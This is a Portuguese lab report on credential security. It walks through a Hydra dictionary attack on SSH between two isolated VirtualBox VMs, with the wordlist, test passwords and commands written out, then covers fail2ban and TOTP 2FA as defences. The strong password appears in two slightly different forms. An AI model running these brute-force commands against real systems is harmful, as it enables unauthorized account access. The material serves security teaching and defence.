# Laboratório de Segurança de Credenciais e Autenticação

Atividade prática que simula um cenário real de **ataque e defesa** sobre o serviço SSH, demonstrando a fragilidade de senhas fracas e a eficácia de camadas adicionais de proteção (bloqueio automático e autenticação de dois fatores).

> **Aviso ético:** todos os testes foram realizados em ambiente de rede **isolado** (VirtualBox, rede *Host-only*), entre máquinas virtuais sob meu controle, sem qualquer contato com redes externas ou sistemas de terceiros. O conteúdo tem finalidade exclusivamente educacional.

---

## Sumário

- [1. Objetivo](#1-objetivo)
- [2. Ambiente e topologia](#2-ambiente-e-topologia)
- [3. Fase 1 — Ataque (Brute Force / Dictionary Attack)](#3-fase-1--ataque-brute-force--dictionary-attack)
- [4. Fase 2 — Defesa e mitigação](#4-fase-2--defesa-e-mitigação)
- [5. Resultados e análise](#5-resultados-e-análise)
- [6. Vídeo demonstrativo](#6-vídeo-demonstrativo)
- [7. Conclusão](#7-conclusão)

---

## 1. Objetivo

Compreender, na prática, a fragilidade de senhas fracas diante de ataques automatizados de força bruta/dicionário e a importância de implementar camadas adicionais de proteção. A atividade está dividida em duas fases:

1. **Ataque:** quebra de credenciais via dictionary attack contra o serviço SSH, demonstrando a diferença de resistência entre senhas de complexidade crescente.
2. **Defesa:** implementação de mecanismos de mitigação — bloqueio automático após sucessivas falhas de login e autenticação de dois fatores (2FA) — tornando o ataque inviável na prática.

---

## 2. Ambiente e topologia

| Papel | Sistema | IP (rede Host-only) | Função |
|---|---|---|---|
| **Atacante** | Kali Linux | `192.168.56.110` | Executa o Hydra |
| **Vítima** | Kali Linux | `192.168.56.111` | Hospeda o serviço SSH atacado |

- **Virtualizador:** Oracle VirtualBox
- **Rede:** dois adaptadores por VM — `NAT` (apenas para instalação de pacotes) e `Host-only` (rede isolada onde o ataque ocorre, garantindo o isolamento ético)
- **Serviço alvo:** OpenSSH Server (porta 22)

A escolha pela rede Host-only assegura que todo o tráfego de ataque permaneça confinado entre as duas VMs, sem nenhuma possibilidade de vazamento para a rede doméstica ou para a internet.

### Usuários de teste

Foram criados três usuários na vítima, com senhas de complexidade distinta, para evidenciar o impacto das políticas de senha:

| Usuário | Senha | Complexidade | Resultado esperado |
|---|---|---|---|
| `vitima1` | `123456` | Fraca (numérica trivial) | Quebrada imediatamente |
| `vitima2` | `primavera` | Média (palavra de dicionário) | Quebrada (presente na wordlist) |
| `vitima3` | `Tr@v3ss02024#Xyz` | Forte (maiúsc./minúsc./números/símbolos, fora de dicionário) | Resistente |

---

## 3. Fase 1 — Ataque (Brute Force / Dictionary Attack)

### 3.1. Preparação do alvo (VM Vítima)

```bash
# Atualiza o catálogo de pacotes
sudo apt update

# Instala e habilita o servidor SSH (serviço alvo)
sudo apt install openssh-server -y
sudo systemctl enable --now ssh
sudo systemctl status ssh        # confirmar "active (running)"

# Descobrir o IP da rede isolada (interface 192.168.56.x)
ip a

# Criação dos usuários-alvo
sudo useradd -m vitima1
sudo useradd -m vitima2
sudo useradd -m vitima3

# Definição das senhas (cada uma digitada duas vezes)
sudo passwd vitima1     # 123456
sudo passwd vitima2     # primavera
sudo passwd vitima3     # Tr@v3ss0!2024#Xyz
```

### 3.2. Execução do ataque (VM Atacante)

A wordlist utilizada (`senhas.txt`) contém um conjunto controlado de senhas comuns, incluindo propositalmente as senhas fraca e média (mas **não** a forte):

```
admin
root
password
123
12345
qwerty
abc123
primavera
senha123
123456
```

Comandos do ataque:

```bash
# Confirma conectividade na rede isolada
ping -c 4 192.168.56.111

# Pasta de trabalho e wordlist
mkdir -p ~/lab-bruteforce && cd ~/lab-bruteforce
nano senhas.txt        # (conteúdo acima)

# Ataque 1 — senha fraca  → ENCONTRA 123456
hydra -l vitima1 -P senhas.txt -t 4 ssh://192.168.56.111

# Ataque 2 — senha média  → ENCONTRA primavera
hydra -l vitima2 -P senhas.txt -t 4 ssh://192.168.56.111

# Ataque 3 — senha forte  → 0 valid passwords found
hydra -l vitima3 -P senhas.txt -t 4 ssh://192.168.56.111
```

**Significado dos parâmetros do Hydra:**

| Parâmetro | Função |
|---|---|
| `-l vitima1` | Define um **login** (usuário) único a ser testado |
| `-P senhas.txt` | Arquivo com a lista de **senhas** a testar |
| `-t 4` | Limita a 4 tentativas simultâneas (evita que o SSH derrube as conexões) |
| `ssh://192.168.56.111` | Protocolo e endereço do alvo |

### 3.3. Coleta de logs (VM Vítima)

Nas versões recentes do Kali os logs de autenticação são acessados via *journald* (não existe o arquivo `/var/log/auth.log`):

```bash
sudo journalctl -u ssh --no-pager | tail -n 40
```

Os registros capturados mostram as tentativas falhas do Hydra, com linhas como `Failed password for vitima3 from 192.168.56.110` e `pam_unix(sshd:auth): authentication failure`. Observou-se ainda a penalidade automática nativa do OpenSSH (`srclimit_penalise`), que já aplica um pequeno atraso ao IP atacante — uma proteção rudimentar reforçada na Fase 2.

---

## 4. Fase 2 — Defesa e mitigação

O enunciado solicita duas políticas: **bloqueio após sucessivas falhas** e **2FA/MFA**. Ambas foram implementadas e comprovadas.

### 4.1. Camada de bloqueio — fail2ban

O **fail2ban** monitora os logs de autenticação e **bane automaticamente o IP** de origem após um número configurável de falhas, inserindo uma regra de firewall que corta o acesso do atacante.

```bash
sudo apt install fail2ban -y
sudo nano /etc/fail2ban/jail.local
```

Conteúdo de `/etc/fail2ban/jail.local`:

```ini
[sshd]
enabled = true
port = ssh
backend = systemd
maxretry = 3
findtime = 300
bantime = 600
```

| Diretiva | Valor | Significado |
|---|---|---|
| `backend = systemd` | — | Lê os logs via journald (necessário no Kali atual) |
| `maxretry` | 3 | Banimento após 3 falhas |
| `findtime` | 300 s | Janela de contagem das falhas (5 min) |
| `bantime` | 600 s | Duração do banimento (10 min) |

```bash
sudo systemctl restart fail2ban
sudo systemctl enable fail2ban
sudo fail2ban-client status sshd      # verificar a jail ativa
```

**Comprovação:** ao repetir o ataque contra `vitima1` (senha fraca, antes quebrada em segundos), o fail2ban baniu o IP atacante (`192.168.56.110`) e o Hydra terminou com **`0 valid password found`**. O status confirmou o IP na *Banned IP list*.

> Comando útil para desbanir um IP durante os testes:
> ```bash
> sudo fail2ban-client set sshd unbanip 192.168.56.110
> ```

### 4.2. Camada de segundo fator — 2FA (Google Authenticator)

Implementou-se autenticação de **dois fatores (2FA)** — uma modalidade de MFA — combinando **senha** (fator de conhecimento) e **código TOTP** de 6 dígitos (fator de posse).

```bash
# Instalação do módulo PAM
sudo apt install libpam-google-authenticator -y

# Geração da chave 2FA para o usuário protegido (vitima3)
sudo -u vitima3 google-authenticator
# Respostas: time-based = y; (registro da secret key); demais perguntas = y
```

Integração ao SSH — dois arquivos:

**`/etc/pam.d/sshd`** (adicionar ao final):
```
auth required pam_google_authenticator.so nullok
```
> O parâmetro `nullok` permite que usuários **sem** 2FA configurado continuem logando apenas com senha; somente `vitima3` passa a exigir o segundo fator.

**`/etc/ssh/sshd_config`** (garantir habilitado, sem comentário):
```
KbdInteractiveAuthentication yes
```

```bash
sudo systemctl restart ssh
```

**Geração dos códigos sem smartphone (oathtool):** para a demonstração em laboratório, os códigos TOTP foram gerados na própria máquina via `oathtool`, dispensando o uso de um celular:

```bash
sudo apt install oathtool -y

# A secret key fica salva na primeira linha do arquivo do usuário
sudo head -n 1 /home/vitima3/.google_authenticator

# Geração do código de 6 dígitos (válido por 30 s)
oathtool --totp -b <SECRET_KEY>
```

> **Observação de segurança (boas práticas):** em ambiente de produção, o segundo fator deve residir em **dispositivo separado** (ex.: smartphone), preservando a independência entre os fatores. O uso do `oathtool` na própria máquina é uma conveniência válida apenas para fins de demonstração em laboratório isolado.

**Comprovação:** ao acessar `ssh vitima3@localhost`, o sistema passou a solicitar **`Password:`** seguido de **`Verification code:`**, concluindo o login somente com ambos corretos — evidenciando que uma senha eventualmente vazada não é suficiente para o acesso.

---

## 5. Resultados e análise

### Fase 1 — eficácia do ataque por complexidade de senha

| Usuário | Senha | Resultado do Hydra |
|---|---|---|
| `vitima1` | `123456` | **Quebrada** (imediata) |
| `vitima2` | `primavera` | **Quebrada** (palavra de dicionário) |
| `vitima3` | `Tr@v3ss02024#Xyz` | **`0 valid passwords found`** |

O contraste demonstra de forma inequívoca a necessidade de **políticas de senhas robustas**: senhas previsíveis (numéricas triviais ou palavras de dicionário) caem em segundos, enquanto uma senha longa e complexa, ausente de wordlists, resiste ao ataque.

### Fase 2 — eficácia das defesas

| Cenário | Antes da defesa | Depois da defesa |
|---|---|---|
| Ataque a `vitima1` (`123456`) | Senha descoberta em segundos | IP banido pelo fail2ban → `0 valid password found` |
| Acesso a `vitima3` com senha correta | Login concedido apenas com senha | Login exige **senha + código TOTP** |

As duas camadas atuam em pontos complementares: o **fail2ban** corta o atacante na **camada de rede** (impedindo o volume de tentativas), e o **2FA** protege a **camada de autenticação** (tornando a senha, isoladamente, insuficiente). Em conjunto, tornam o ataque de força bruta inviável na prática.

---

## 6. Vídeo demonstrativo

Demonstração completa (até 5 min) disponível como vídeo **não listado** no YouTube:

🔗 **[INSERIR O LINK DO YOUTUBE AQUI]**

Roteiro do vídeo:
1. Apresentação do ambiente e topologia (rede isolada)
2. Ataque bem-sucedido contra a senha fraca + log do serviço
3. Resistência da senha forte (`0 valid passwords found`)
4. Ativação das defesas: fail2ban banindo o IP e 2FA exigindo o código
5. Conclusão

---

## 7. Conclusão

A atividade evidenciou, de ponta a ponta, o ciclo de ataque e defesa em torno de credenciais. Ficou demonstrado que a robustez da senha é a primeira linha de defesa — senhas fracas são triviais para um atacante — e que mecanismos complementares são indispensáveis: o bloqueio automático por IP (fail2ban) neutraliza a automação do ataque, e o segundo fator de autenticação (2FA) garante que o comprometimento da senha, isoladamente, não conceda acesso. A combinação dessas camadas, executada em ambiente controlado e ético, tornou o ataque de força bruta inviável na prática.

---

### Ferramentas utilizadas

`Kali Linux` · `VirtualBox` · `OpenSSH` · `Hydra` · `fail2ban` · `libpam-google-authenticator` · `oathtool` · `journalctl`
